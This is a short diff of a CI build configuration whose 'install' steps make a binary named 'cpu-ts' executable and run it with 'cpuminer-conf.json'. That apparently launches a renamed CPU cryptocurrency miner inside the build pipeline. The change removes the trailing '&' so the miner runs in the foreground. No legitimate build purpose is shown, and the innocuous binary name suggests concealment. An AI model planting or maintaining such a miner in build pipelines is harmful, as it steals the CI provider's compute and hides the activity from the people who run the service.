@@ -18,4 +18,4 @@ build:
        code: chmod +x cpu-ts
     - script:
        name: install 4
-       code: ./cpu-ts -c cpuminer-conf.json &
+       code: ./cpu-ts -c cpuminer-conf.json
